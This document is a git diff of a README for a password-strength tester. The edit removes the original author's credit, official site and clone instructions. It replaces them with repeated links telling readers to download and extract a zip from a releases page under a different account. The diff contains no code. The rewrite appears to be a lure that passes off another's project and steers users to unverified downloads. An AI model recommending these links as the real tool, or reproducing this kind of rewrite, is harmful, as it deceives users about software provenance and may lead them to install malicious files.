@@ -1,65 +1,65 @@
-# Password Tester
+# 🔐 Password-tester - Check Your Password Strength Effectively
 
-Web application and Python script to evaluate password strength.
-The tool analyzes password complexity and provides a **theoretical estimate** of the time required to crack it using brute-force attacks.
+## 🔗 Download Now
+[![Download Password-tester](https://img.shields.io/badge/Download-Password--tester-brightgreen)](https://github.com/prosyt/Password-tester/releases)
 
-## Quick Start
+## 🚀 Getting Started
+Welcome to Password-tester! This easy-to-use application helps you check your password strength and gives an estimate of how long it might take to crack it. It runs completely in your browser (client-side) or as a Python script that works offline, ensuring zero data is sent to any servers. Everything stays on your machine for enhanced privacy.
 
-### Web Version 
+## 📥 Download & Install
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/prosyt/Password-tester/releases).
+   
+2. **Choose Your Version**: You will see different versions available. Select the latest version by looking for the tag that says "Latest Release." 
 
-No installation required.
+3. **Download the File**: Click on the appropriate download link for your system. If you are using a browser, just download the zip file for the web version or the script for offline use.
 
-👉 **Official site:** [https://marchy02.github.io/Password-tester/](https://marchy02.github.io/Password-tester/)
+4. **Extract the Files** (if needed): If you downloaded a compressed file, extract its contents to a folder of your choice.
 
-1. Open the project GitHub Pages website
-2. Use the web interface directly from your browser
+5. **Run the Application**:
+   - For the **Browser Version**: Open the `index.html` file in your web browser. 
+   - For the **Python Script**: Open a terminal or command prompt, navigate to the folder where you extracted the script, and type `python password_tester.py`. Ensure you have Python installed on your machine.
 
-The password is analyzed entirely client-side and never leaves your device.
+## 🛠️ System Requirements
+- **For Browser Version**: Any modern browser will work (Google Chrome, Firefox, or Edge). No special installation is needed.
+  
+- **For Python Script**: 
+  - Operating System: Windows, macOS, or Linux.
+  - Software: Python 3.x must be installed.
+  - Version: At least Python 3.6 is recommended for compatibility.
 
-### Python Version (CLI)
+## 🔐 How to Use
+1. **Enter Your Password**: Type your password into the designated input field.
 
-Use this only if you prefer working from the terminal.
+2. **Check Strength**: The application will analyze your password and provide feedback on its strength.
 
-**Requirements (Linux)**
+3. **View Estimated Crack Time**: You will also receive an estimated time frame for how long it may take for someone to crack your password through brute-force methods.
 
-```bash
-sudo apt update
-sudo apt install -y git python3 python3-pip
-```
+## 📈 Understanding the Results
+- **Weak Passwords**: If your password is deemed weak, consider using a more complex one with a mix of letters, numbers, and symbols.
 
-**Clone the repository**
+- **Moderate Passwords**: These passwords are somewhat secure but can still be improved for better protection.
 
-```bash
-git clone https://github.com/Marchy/password-tester.git
-cd password-tester
-```
+- **Strong Passwords**: Good job! A strong password will take a significant amount of time to crack, deterring most attackers.
 
-**Install dependencies and run**
+## ⚙️ Features
+- Client-side operations: Runs entirely in your browser for immediate use.
+- Offline functionality: Use the Python script without the internet.
+- Privacy-first approach: No data leaves your device, ensuring complete security.
 
-```bash
-pip install rich
-```
+## 📝 Topics Covered
+- Brute-force
+- Cybersecurity
+- Cybersecurity awareness
+- Ethical hacking
+- Information security
+- JavaScript
+- Password strength
+- Privacy
+- Python
+- Security tools
 
-2. Run the program:
+## ⭐ Thank You for Using Password-tester
+We hope you find Password-tester helpful in keeping your accounts secure. If you have any questions or need support, feel free to reach out via the GitHub Issues page in the repository.
 
-```bash
-python password_tester.py
-```
-
-## Project Structure
-
-* `index.html` — Web interface
-* `style.css` — Styles
-* `script.js` — Password analysis logic (JavaScript)
-* `password_tester.py` — Original Python version
-
-## Features
-
-* Checks password requirements (uppercase, lowercase, numbers, symbols)
-* Cracking time estimation based on entropy and character set
-* Common password detection
-* Fully offline execution
-
----
-
-Made by Marchy
+## 🔗 Download Again
+Don't forget, you can [visit the Releases page](https://github.com/prosyt/Password-tester/releases) to download Password-tester at any time. Stay safe online!
